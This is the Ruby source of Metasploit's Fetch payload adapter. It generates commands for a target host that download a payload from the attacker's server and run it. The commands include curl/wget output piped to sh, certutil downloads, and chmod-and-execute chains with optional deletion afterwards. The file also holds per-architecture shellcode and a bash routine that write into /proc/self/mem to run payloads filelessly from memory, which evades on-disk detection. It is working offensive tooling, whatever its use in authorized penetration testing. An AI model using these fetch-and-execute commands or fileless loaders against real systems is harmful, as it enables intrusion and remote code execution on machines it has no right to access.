module Msf::Payload::Adapter::Fetch
  def initialize(*args)
    super
    register_options(
      [
        Msf::OptBool.new('FETCH_DELETE', [true, 'Attempt to delete the binary after execution', false]),
        Msf::OptPort.new('FETCH_SRVPORT', [true, 'Local port to use for serving payload', 8080]),
        # FETCH_SRVHOST defaults to LHOST, but if the payload doesn't connect back to Metasploit (e.g. adduser, messagebox, etc.) then FETCH_SRVHOST needs to be set
        Msf::OptAddressRoutable.new('FETCH_SRVHOST', [ !options['LHOST']&.required, 'Local IP to use for serving payload']),
        Msf::OptString.new('FETCH_URIPATH', [ false, 'Local URI to use for serving payload', '']),
      ]
    )
    register_advanced_options(
      [
        Msf::OptAddress.new('FetchListenerBindAddress', [ false, 'The specific IP address to bind to to serve the payload if different from FETCH_SRVHOST']),
        Msf::OptPort.new('FetchListenerBindPort', [false, 'The port to bind to if different from FETCH_SRVPORT']),
        Msf::OptBool.new('FetchHandlerDisable', [true, 'Disable fetch handler', false])
      ]
    )
    @fetch_service = nil
    @myresources = []
    @srvexe = ''
    @pipe_uri = nil
    @pipe_cmd = nil
    @remote_destination_win = nil
    @remote_destination_nix = nil
    @windows = nil
  end

  # If no fetch URL is provided, we generate one based off the underlying payload data
  # This is because if we use a randomly-generated URI, the URI generated by venom and
  # Framework will not match.  This way, we can build a payload in venom and a listener
  # in Framework, and if the underlying payload type/host/port are the same, the URI
  # will be, too.
  #
  def default_srvuri(extra_data = nil)
    # If we're in framework, payload is in datastore; msfvenom has it in refname
    payload_name = datastore['payload'] ||= refname
    decoded_uri = payload_name.dup
    # there may be no transport, so leave the connection string off if that's the case
    netloc = ''
    if module_info['ConnectionType'].upcase == 'REVERSE' || module_info['ConnectionType'].upcase == 'TUNNEL'
      netloc << datastore['LHOST'] unless datastore['LHOST'].blank?
      unless datastore['LPORT'].blank?
        if Rex::Socket.is_ipv6?(netloc)
          netloc = "[#{netloc}]:#{datastore['LPORT']}"
        else
          netloc = "#{netloc}:#{datastore['LPORT']}"
        end
      end
    elsif module_info['ConnectionType'].upcase == 'BIND'
      netloc << datastore['LHOST'] unless datastore['LHOST'].blank?
      unless datastore['RPORT'].blank?
        if Rex::Socket.is_ipv6?(netloc)
          netloc = "[#{netloc}]:#{datastore['RPORT']}"
        else
          netloc = "#{netloc}:#{datastore['RPORT']}"
        end
      end
    end
    decoded_uri << ";#{netloc}"
    decoded_uri << ";#{extra_data}" unless extra_data.nil?
    Base64.urlsafe_encode64(OpenSSL::Digest::MD5.new(decoded_uri).digest, padding: false)
  end

  def download_uri
    "#{srvnetloc}/#{srvuri}"
  end

  def _download_pipe
    "#{srvnetloc}/#{@pipe_uri}"
  end

  def fetch_bindhost
    datastore['FetchListenerBindAddress'].blank? ? srvhost : datastore['FetchListenerBindAddress']
  end

  def fetch_bindport
    datastore['FetchListenerBindPort'].blank? ? srvport : datastore['FetchListenerBindPort']
  end

  def fetch_bindnetloc
    Rex::Socket.to_authority(fetch_bindhost, fetch_bindport)
  end

  def pipe_supported_binaries
    # this is going to expand when we add psh support
    return %w[CURL] if windows?
    %w[WGET GET CURL]
  end

  def generate(opts = {})
    opts[:arch] ||= module_info['AdaptedArch']
    opts[:code] = super
    @srvexe = generate_payload_exe(opts)
    if datastore['FETCH_PIPE']
      unless pipe_supported_binaries.include?(datastore['FETCH_COMMAND'].upcase)
        fail_with(Msf::Module::Failure::BadConfig, "Unsupported binary selected for FETCH_PIPE option: #{datastore['FETCH_COMMAND']}, must be one of #{pipe_supported_binaries}.")
      end
      @pipe_cmd = generate_fetch_commands
      @pipe_cmd << "\n" if windows? #need CR when we pipe command in Windows
      vprint_status("Command served: #{@pipe_cmd}")
      cmd = generate_pipe_command
    else
      cmd = generate_fetch_commands
    end
    vprint_status("Command to run on remote host: #{cmd}")
    cmd
  end

  def generate_pipe_command
    # TODO: Make a check method that determines if we support a platform/server/command combination
    @pipe_uri = pipe_srvuri

    case datastore['FETCH_COMMAND'].upcase
    when 'WGET'
      return _generate_wget_pipe
    when 'GET'
      return _generate_get_pipe
    when 'CURL'
      return _generate_curl_pipe
    else
      fail_with(Msf::Module::Failure::BadConfig, "Unsupported binary selected for FETCH_PIPE option: #{datastore['FETCH_COMMAND']}, must be one of #{pipe_supported_binaries}.")
    end
  end

  def generate_fetch_commands
    # TODO: Make a check method that determines if we support a platform/server/command combination
    #
    case datastore['FETCH_COMMAND'].upcase
    when 'FTP'
      return _generate_ftp_command
    when 'TNFTP'
      return _generate_tnftp_command
    when 'WGET'
      return _generate_wget_command
    when 'GET'
      return _generate_get_command
    when 'CURL'
      return _generate_curl_command
    when 'TFTP'
      return _generate_tftp_command
    when 'CERTUTIL'
      return _generate_certutil_command
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end
  end

  def generate_stage(opts = {})
    opts[:arch] ||= module_info['AdaptedArch']
    super
  end

  def generate_payload_uuid(conf = {})
    conf[:arch] ||= module_info['AdaptedArch']
    conf[:platform] ||= module_info['AdaptedPlatform']
    super
  end

  def handle_connection(conn, opts = {})
    opts[:arch] ||= module_info['AdaptedArch']
    super
  end

  def srvhost
    host = datastore['FETCH_SRVHOST']
    host = datastore['LHOST'] if host.blank?
    host = '127.127.127.127' if host.blank?
    host
  end

  def srvnetloc
    Rex::Socket.to_authority(srvhost, srvport)
  end

  def srvport
    datastore['FETCH_SRVPORT']
  end

  def srvuri
    # If the user has selected FETCH_PIPE, we save any user-defined uri for the pipe command
    return default_srvuri if datastore['FETCH_PIPE'] || datastore['FETCH_URIPATH'].blank?

    datastore['FETCH_URIPATH']
  end

  def pipe_srvuri
    return datastore['FETCH_URIPATH'] unless datastore['FETCH_URIPATH'].blank?

    default_srvuri('pipe')
  end

  def windows?
    return @windows unless @windows.nil?

    @windows = platform.platforms.first == Msf::Module::Platform::Windows
    @windows
  end

  def linux?
    return @linux unless @linux.nil?

    @linux = platform.platforms.first == Msf::Module::Platform::Linux
    @linux
  end

  def _check_tftp_port
    # Most tftp clients do not have configurable ports
    if datastore['FETCH_SRVPORT'] != 69 && datastore['FetchListenerBindPort'].blank?
      print_error('The TFTP client can only connect to port 69; to start the server on a different port use FetchListenerBindPort and redirect the connection.')
      fail_with(Msf::Module::Failure::BadConfig, 'FETCH_SRVPORT must be set to 69 when using the tftp client')
    end
  end

  def _check_tftp_file
    # Older Linux tftp clients do not support saving the file under a different name
    unless datastore['FETCH_WRITABLE_DIR'].blank? && datastore['FETCH_FILENAME'].blank?
      print_error('The Linux TFTP client does not support saving a file under a different name than the URI.')
      fail_with(Msf::Module::Failure::BadConfig, 'FETCH_WRITABLE_DIR and FETCH_FILENAME must be blank when using the tftp client')
    end
  end

  # copied from https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/socket_server.rb
  def _determine_server_comm(ip, srv_comm = datastore['ListenerComm'].to_s)
    comm = nil

    case srv_comm
    when 'local'
      comm = ::Rex::Socket::Comm::Local
    when /\A-?[0-9]+\Z/
      comm = framework.sessions.get(srv_comm.to_i)
      raise("Socket Server Comm (Session #{srv_comm}) does not exist") unless comm
      raise("Socket Server Comm (Session #{srv_comm}) does not implement Rex::Socket::Comm") unless comm.is_a? ::Rex::Socket::Comm
    when nil, ''
      unless ip.nil?
        comm = Rex::Socket::SwitchBoard.best_comm(ip)
      end
    else
      raise("SocketServer Comm '#{srv_comm}' is invalid")
    end

    comm || ::Rex::Socket::Comm::Local
  end

  def _execute_add(get_file_cmd)
    return _execute_win(get_file_cmd) if windows?

    return _execute_nix(get_file_cmd)
  end

  def _execute_win(get_file_cmd)
    cmds = " & start /B #{_remote_destination_win}"
    cmds << " & del #{_remote_destination_win}" if datastore['FETCH_DELETE']
    get_file_cmd << cmds
  end

  def _execute_nix(get_file_cmd)
    return _generate_fileless_bash(get_file_cmd) if datastore['FETCH_FILELESS'] == 'bash'
    return _generate_fileless_python(get_file_cmd) if datastore['FETCH_FILELESS'] == 'python3.8+'


    cmds = get_file_cmd
    cmds << ";chmod +x #{_remote_destination_nix}"
    cmds << ";#{_remote_destination_nix}&"
    cmds << "sleep #{rand(3..7)};rm -rf #{_remote_destination_nix}" if datastore['FETCH_DELETE']
    cmds
  end

  def _generate_certutil_command
    case fetch_protocol
    when 'HTTP'
      get_file_cmd = "certutil -urlcache -f http://#{download_uri} #{_remote_destination}"
    when 'HTTPS'
      # I don't think there is a way to disable cert check in certutil....
      print_error('CERTUTIL binary does not support insecure mode')
      fail_with(Msf::Module::Failure::BadConfig, 'FETCH_CHECK_CERT must be true when using CERTUTIL')
      get_file_cmd = "certutil -urlcache -f https://#{download_uri} #{_remote_destination}"
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end
    _execute_add(get_file_cmd)
  end

  def _generate_first_stage_shellcode
    case module_info['AdaptedArch']
    when 'x64'
      # fd = memfd_create()
      # ftruncate(fd, null)
      # pause()
      in_memory_loader_asm = %(
      start:
          xor rsi, rsi
          push rsi
          push rsp
          pop rdi
          mov rax, 0xfffffffffffffec1 
          neg rax
          syscall
          mov rdi,rax
          mov al, 0x4d
          syscall
          push 0x22
          pop rax
          syscall

      )
      payload = Metasm::Shellcode.assemble(Metasm::X64.new, in_memory_loader_asm).encode_string
    when 'x86'
      # fd = memfd_create()
      # ftruncate(fd, null)
      # pause()
      in_memory_loader_asm= %(
        xor ecx, ecx
        push ecx
        lea ebx, [esp]
        inc ecx
        mov eax, 0xfffffe9c
        neg eax
        int 0x80
        mov ebx, eax
        mov al, 0x5d
        int 0x80
        mov al, 0x1d
        int 0x80
      )
      payload = Metasm::Shellcode.assemble(Metasm::X86.new, in_memory_loader_asm).encode_string
    when 'aarch64'
      # fd = memfd_create()
      # ftruncate(fd, null)
      # pid = getpid()
      # kill(pid,SIGSTOP)
      in_memory_loader_asm = [
          0x000080d2, #0x1000:	mov	x0, #0	0x000080d2
          0xe00f1ff8, #0x1004:	str	x0, [sp, #-0x10]!	0xe00f1ff8
          0xe0030091, #0x1008:	mov	x0, sp	0xe0030091
          0x210001ca, #0x100c:	eor	x1, x1, x1	0x210001ca
          0xe82280d2, #0x1010:	mov	x8, #0x117	0xe82280d2
          0x010000d4, #0x1014:	svc	#0	0x010000d4
          0xc80580d2, #0x1018:	mov	x8, #0x2e	0xc80580d2
          0x010000d4, #0x101c:	svc	#0	0x010000d4
          0x881580d2, #0x1020:	mov	x8, #0xac	0x881580d2
          0x010000d4, #0x1024:	svc	#0	0x010000d4
          0x610280d2, #0x1028:	mov	x1, #0x13	0x610280d2
          0x281080d2, #0x102c:	mov	x8, #0x81	0x281080d2
          0x010000d4, #0x1030:	svc	#0	0x010000d4

      ]
      payload = in_memory_loader_asm.pack("N*")
    when 'armle'
      in_memory_loader_asm = [
          0x4ff00002, #0x1000:	mov.w	r2, #0	0x4ff00002
          0x4df8042d, #0x1004:	str	r2, [sp, #-0x4]!	0x4df8042d
          0x6846, #0x1008:	mov	r0, sp	0x6846
          0x4ff00101, #0x100a:	mov.w	r1, #1	0x4ff00101
          0x4ff08307, #0x100e:	mov.w	r7, #0x83	0x4ff08307
          0x07f1fe07, #0x1012:	add.w	r7, r7, #0xfe	0x07f1fe07
          0x00df, #0x1016:	svc	#0	0x00df
          0x4ff05d07, #0x1018:	mov.w	r7, #0x5d	0x4ff05d07
          0x00df, #0x101c:	svc	#0	0x00df
          0x4ff01d07, #0x101e:	mov.w	r7, #0x1d	0x4ff01d07
          0x00df, #0x1022:	svc	#0	0x00df
      ]
      payload = in_memory_loader_asm.pack("V*")
    when 'armbe'
      # fd = memfd_create()
      # ftruncate(fd, null)
      # pause()
      in_memory_loader_asm = [
          0xf04f0200, #0x1000:	mov.w	r2, #0	0xf04f0200
          0xf84d2d04, #0x1004:	str	r2, [sp, #-0x4]!	0xf84d2d04
          0x4668, #0x1008:	mov	r0, sp	0x4668
          0xf04f0101, #0x100a:	mov.w	r1, #1	0xf04f0101
          0xf04f0783, #0x100e:	mov.w	r7, #0x83	0xf04f0783
          0xf10707fe, #0x1012:	add.w	r7, r7, #0xfe	0xf10707fe
          0xdf00, #0x1016:	svc	#0	0xdf00
          0xf04f075d, #0x1018:	mov.w	r7, #0x5d	0xf04f075d
          0xdf00, #0x101c:	svc	#0	0xdf00
          0xf04f071d, #0x101e:	mov.w	r7, #0x1d	0xf04f071d
          0xdf00, #0x1022:	svc	#0	0xdf00
      ]
      payload = in_memory_loader_asm.pack("V*")
    when 'mips64'
      in_memory_loader_asm = [
          0xfcffa0af, #0x1000:	sw	$zero, -4($sp)	0xfcffa0af
          0xfcffbd27, #0x1004:	addiu	$sp, $sp, -4	0xfcffbd27
          0x2020a003, #0x1008:	add	$a0, $sp, $zero	0x2020a003
          0xfeff1924, #0x100c:	addiu	$t9, $zero, -2	0xfeff1924
          0x27282003, #0x1010:	not	$a1, $t9	0x27282003
          0x02110224, #0x1014:	addiu	$v0, $zero, 0x1102	0x02110224
          0x0c000000, #0x1018:	syscall		0x0c000000
          0x2528e003, #0x101c:	move	$a1, $ra	0x2528e003
          0xfd0f0224, #0x1020:	addiu	$v0, $zero, 0xffd	0xfd0f0224
          0x0c000000, #0x1024:	syscall		0x0c000000
          0xbd0f0224, #0x1028:	addiu	$v0, $zero, 0xfbd	0xbd0f0224
          0x0c000000, #0x102c:	syscall		0x0c000000
      ]
      payload = in_memory_loader_asm.pack('V*')
    when 'mipsbe'
      in_memory_loader_asm = [
          0xafa0fffc, #0x1000:	sw	$zero, -4($sp)	0xafa0fffc
          0x27bdfffc, #0x1004:	addiu	$sp, $sp, -4	0x27bdfffc
          0x03a02020, #0x1008:	add	$a0, $sp, $zero	0x03a02020
          0x2419fffe, #0x100c:	addiu	$t9, $zero, -2	0x2419fffe
          0x03202827, #0x1010:	not	$a1, $t9	0x03202827
          0x24021102, #0x1014:	addiu	$v0, $zero, 0x1102	0x24021102
          0x0000000c, #0x1018:	syscall		0x0000000c
          0x03e02825, #0x101c:	move	$a1, $ra	0x03e02825
          0x24020ffd, #0x1020:	addiu	$v0, $zero, 0xffd	0x24020ffd
          0x0000000c, #0x1024:	syscall		0x0000000c
          0x24020fbd, #0x1028:	addiu	$v0, $zero, 0xfbd	0x24020fbd
          0x0000000c, #0x102c:	syscall		0x0000000c
      ]
      payload = in_memory_loader_asm.pack('V*')
    when 'mipsle'
      in_memory_loader_asm = [
          0xfcffa0af, #0x1000:	sw	$zero, -4($sp)	0xfcffa0af
          0xfcffbd27, #0x1004:	addiu	$sp, $sp, -4	0xfcffbd27
          0x2020a003, #0x1008:	add	$a0, $sp, $zero	0x2020a003
          0xfeff1924, #0x100c:	addiu	$t9, $zero, -2	0xfeff1924
          0x27282003, #0x1010:	not	$a1, $t9	0x27282003
          0x02110224, #0x1014:	addiu	$v0, $zero, 0x1102	0x02110224
          0x0c000000, #0x1018:	syscall		0x0c000000
          0x2528e003, #0x101c:	move	$a1, $ra	0x2528e003
          0xfd0f0224, #0x1020:	addiu	$v0, $zero, 0xffd	0xfd0f0224
          0x0c000000, #0x1024:	syscall		0x0c000000
          0xbd0f0224, #0x1028:	addiu	$v0, $zero, 0xfbd	0xbd0f0224
          0x0c000000, #0x102c:	syscall		0x0c000000
      ]
      payload = in_memory_loader_asm.pack('V*')
    when 'ppc'
      in_memory_loader_asm = [
          0x0000c039, #0x1000:	li	r14, 0	0x0000c039
          0x0000c195, #0x1004:	stwu	r14, 0(r1)	0x0000c195
          0x780b237c, #0x1008:	mr	r3, r1	0x780b237c
          0x00008038, #0x100c:	li	r4, 0	0x00008038
          0x68010038, #0x1010:	li	r0, 0x168	0x68010038
          0x02000044, #0x1014:	sc		0x02000044
          0x5d000038, #0x1018:	li	r0, 0x5d	0x5d000038
          0x02000044, #0x101c:	sc		0x02000044
          0x1d000038, #0x1020:	li	r0, 0x1d	0x1d000038
          0x02000044, #0x1024:	sc		0x02000044
      ]
      payload = in_memory_loader_asm.pack('N*')
    when 'ppc64'
      in_memory_loader_asm = [
          0x39c00000, #0x1000:	li	r14, 0	0x39c00000
          0x95c10000, #0x1004:	stwu	r14, 0(r1)	0x95c10000
          0x7c230b78, #0x1008:	mr	r3, r1	0x7c230b78
          0x38800000, #0x100c:	li	r4, 0	0x38800000
          0x38000168, #0x1010:	li	r0, 0x168	0x38000168
          0x44000002, #0x1014:	sc		0x44000002
          0x3800005d, #0x1018:	li	r0, 0x5d	0x3800005d
          0x44000002, #0x101c:	sc		0x44000002
          0x3800001d, #0x1020:	li	r0, 0x1d	0x3800001d
          0x44000002, #0x1024:	sc		0x44000002
    ]
      payload = in_memory_loader_asm.pack('N*')
    when 'ppc64le'
      in_memory_loader_asm = [
          0x0000c039, #0x1000:	li	r14, 0	0x0000c039
          0x0000c195, #0x1004:	stwu	r14, 0(r1)	0x0000c195
          0x780b237c, #0x1008:	mr	r3, r1	0x780b237c
          0x00008038, #0x100c:	li	r4, 0	0x00008038
          0x68010038, #0x1010:	li	r0, 0x168	0x68010038
          0x02000044, #0x1014:	sc		0x02000044
          0x5d000038, #0x1018:	li	r0, 0x5d	0x5d000038
          0x02000044, #0x101c:	sc		0x02000044
          0x1d000038, #0x1020:	li	r0, 0x1d	0x1d000038
          0x02000044, #0x1024:	sc		0x02000044
      ]
      payload = in_memory_loader_asm.pack('N*')
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
    end
    payload.unpack("H*")[0]
    #Base64.strict_encode64(payload).gsub(/\n/, '')
  end

  def _generate_jmp_instruction
    #
    # The sed command will basically take two characters at the time and switch their order, this is due to endianess of x86 addresses
    #
    case module_info['AdaptedArch']
    when 'x64'
      %^"48b8"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
    when 'x86'
      %^"b8"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
    when 'aarch64'
      %^"4000005800001fd6"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
    when 'armle'
      %^"024a1047"$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
    when 'armbe'
      #%^"08209fe51047"$(echo $(printf %04x $vdso_addr))^
      %^"e59f20084710"$(echo $(printf %04x $vdso_addr))^
    when 'mipsle'
      %^$(echo (printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"09340800200100000000"^
    when 'mipsbe'
      %^"2409"$(echo (printf %04x $vdso_addr))"0120000800000000"^
    when 'mips64'
      %^$(echo (printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"09340800200100000000"^
    when 'ppc'
     %^$(echo (printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"0038a603087c2000804e"^ 
    when 'ppc64'
      %^"3800"$(echo (printf %04x $vdso_addr))"7c0803a64e800020"^
    when 'ppc64le'
     %^$(echo (printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"0038a603087c2000804e"^ 
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
    end
  end

  # Original Idea: The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
  # New idea: use /proc/*/mem to write shellcode stager into bash process and create anonymous handle on-fly, then search for that handle and use same approach as original idea
  def _generate_fileless_bash(get_file_cmd)
    stage_cmd = %<vdso_addr=$((0x$(grep -F "[vdso]" /proc/$$/maps | cut -d'-' -f1)));>
    stage_cmd << %(jmp=#{_generate_jmp_instruction};)
    stage_cmd << %(sc='#{_generate_first_stage_shellcode}';)
    stage_cmd << %<jmp=$(printf $jmp | sed 's/\\([0-9A-F]\\{2\\}\\)/\\\\x\\1/gI');>
    stage_cmd << %<sc=$(printf $sc | sed 's/\\([0-9A-F]\\{2\\}\\)/\\\\x\\1/gI');>
    stage_cmd << 'read syscall_info < /proc/self/syscall;'
    stage_cmd << "addr=$(($(echo $syscall_info | cut -d' ' -f9)));"
    stage_cmd << 'exec 3>/proc/self/mem;'
    stage_cmd << 'dd bs=1 skip=$vdso_addr <&3 >/dev/null 2>&1;'
    stage_cmd << 'printf $sc >&3;'
    stage_cmd << 'exec 3>&-;'
    stage_cmd << 'exec 3>/proc/self/mem;'
    stage_cmd << 'dd bs=1 skip=$addr <&3 >/dev/null 2>&1;'
    stage_cmd << 'printf $jmp >&3;'

    cmd = "echo -n '#{Base64.strict_encode64(stage_cmd).gsub(/\n/, '')}' | base64 -d | bash & "
    cmd << 'cd /proc/$!;'
    cmd << 'sleep 1;' #adding short pause to give process time to load file handle
    cmd << 'FOUND=0;if [ $FOUND -eq 0 ];'

    cmd << 'then for f in $(find ./fd -type l -perm u=rwx 2>/dev/null);'
    cmd << 'do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ];'
    cmd << "then if $(#{get_file_cmd} >/dev/null);"
    cmd << 'then $f;FOUND=1;break;'
    cmd << 'fi;'
    cmd << 'fi;'
    cmd << 'done;'
    cmd << 'fi;'
  end
  
  # same idea as _generate_fileless function, but force creating anonymous file handle
  def _generate_fileless_python(get_file_cmd)
    %Q<python3 -c 'import os;fd=os.memfd_create("",os.MFD_CLOEXEC);os.system(f"f=\\"/proc/{os.getpid()}/fd/{fd}\\";#{get_file_cmd};$f&")'> 
  end

  def _generate_curl_command
    case fetch_protocol
    when 'HTTP'
      get_file_cmd = "curl -so #{_remote_destination} http://#{download_uri}"
    when 'HTTPS'
      get_file_cmd = "curl -sko #{_remote_destination} https://#{download_uri}"
    when 'TFTP'
      get_file_cmd = "curl -so #{_remote_destination} tftp://#{download_uri}"
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end
    _execute_add(get_file_cmd)
  end

  def _generate_curl_pipe
    execute_cmd = 'sh'
    execute_cmd = 'cmd' if windows?
    case fetch_protocol
    when 'HTTP'
      return "curl -s http://#{_download_pipe}|#{execute_cmd}"
    when 'HTTPS'
      return "curl -sk https://#{_download_pipe}|#{execute_cmd}"
    else
      fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
    end
  end

  def _generate_get_command
    # Specifying the method (-m GET) is necessary on OSX
    case fetch_protocol
    when 'HTTP'
      get_file_cmd = "GET -m GET http://#{download_uri}>#{_remote_destination}"
    when 'HTTPS'
      # There is no way to disable cert check in GET ...
      print_error('GET binary does not support insecure mode')
      fail_with(Msf::Module::Failure::BadConfig, 'FETCH_CHECK_CERT must be true when using GET')
      get_file_cmd = "GET -m GET https://#{download_uri}>#{_remote_destination}"
    when 'FTP'
      get_file_cmd = "GET ftp://#{download_uri}>#{_remote_destination}"
    else
      fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
    end
    _execute_add(get_file_cmd)
  end

  def _generate_get_pipe
    # Specifying the method (-m GET) is necessary on OSX
    execute_cmd = 'sh'
    execute_cmd = 'cmd' if windows?
    case fetch_protocol
    when 'HTTP'
      return "GET -m GET http://#{_download_pipe}|#{execute_cmd}"
    when 'HTTPS'
      # There is no way to disable cert check in GET ...
      print_error('GET binary does not support insecure mode')
      fail_with(Msf::Module::Failure::BadConfig, 'FETCH_CHECK_CERT must be true when using GET')
      return "GET -m GET https://#{_download_pipe}|#{execute_cmd}"
    when 'FTP'
      return "GET ftp://#{_download_pipe}|#{execute_cmd}"
    else
      fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
    end
  end

  def _generate_ftp_command
    case fetch_protocol
    when 'FTP'
      get_file_cmd = "ftp -Vo #{_remote_destination_nix} ftp://#{download_uri}"
    when 'HTTP'
      get_file_cmd = "ftp -Vo #{_remote_destination_nix} http://#{download_uri}"
    when 'HTTPS'
      get_file_cmd = "ftp -Vo #{_remote_destination_nix} https://#{download_uri}"
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end
    _execute_add(get_file_cmd)
  end

  def _generate_tftp_command
    _check_tftp_port
    case fetch_protocol
    when 'TFTP'
      if windows?
        fetch_command = _execute_win("tftp -i #{srvhost} GET #{srvuri} #{_remote_destination}")
      else
        _check_tftp_file
        if datastore['FETCH_FILELESS'] != 'none' && linux?
          return _generate_fileless("(echo binary ; echo get #{srvuri} $f ) | tftp #{srvhost}")
        else
          fetch_command = "(echo binary ; echo get #{srvuri} ) | tftp #{srvhost}; chmod +x ./#{srvuri}; ./#{srvuri} &"
        end
      end
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end
    fetch_command
  end

  def _generate_tnftp_command
    case fetch_protocol
    when 'FTP'
      get_file_cmd = "tnftp -Vo #{_remote_destination_nix} ftp://#{download_uri}"
    when 'HTTP'
      get_file_cmd = "tnftp -Vo #{_remote_destination_nix} http://#{download_uri}"
    when 'HTTPS'
      get_file_cmd = "tnftp -Vo #{_remote_destination_nix} https://#{download_uri}"
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end
    _execute_add(get_file_cmd)
  end

  def _generate_wget_command
    case fetch_protocol
    when 'HTTPS'
      get_file_cmd = "wget -qO #{_remote_destination} --no-check-certificate https://#{download_uri}"
    when 'HTTP'
      get_file_cmd = "wget -qO #{_remote_destination} http://#{download_uri}"
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end

    _execute_add(get_file_cmd)
  end

  def _generate_wget_pipe
    case fetch_protocol
    when 'HTTPS'
      return "wget --no-check-certificate -qO- https://#{_download_pipe}|sh"
    when 'HTTP'
      return "wget -qO- http://#{_download_pipe}|sh"
    else
      fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
    end
  end

  def _remote_destination
    return _remote_destination_win if windows?

    return _remote_destination_nix
  end

  def _remote_destination_nix
    return @remote_destination_nix unless @remote_destination_nix.nil?

    if datastore['FETCH_FILELESS'] != 'none'
      @remote_destination_nix = '$f'
    else
      writable_dir = datastore['FETCH_WRITABLE_DIR']
      writable_dir = '.' if writable_dir.blank?
      writable_dir += '/' unless writable_dir[-1] == '/'
      payload_filename = datastore['FETCH_FILENAME']
      payload_filename = srvuri if payload_filename.blank?
      payload_path = writable_dir + payload_filename
      @remote_destination_nix = payload_path
    end
    @remote_destination_nix
  end

  def _remote_destination_win
    return @remote_destination_win unless @remote_destination_win.nil?

    writable_dir = datastore['FETCH_WRITABLE_DIR']
    writable_dir += '\\' unless writable_dir.blank? || writable_dir[-1] == '\\'
    payload_filename = datastore['FETCH_FILENAME']
    payload_filename = srvuri if payload_filename.blank?
    payload_path = writable_dir + payload_filename
    payload_path += '.exe' unless payload_path[-4..] == '.exe'
    @remote_destination_win = payload_path
    @remote_destination_win
  end
end
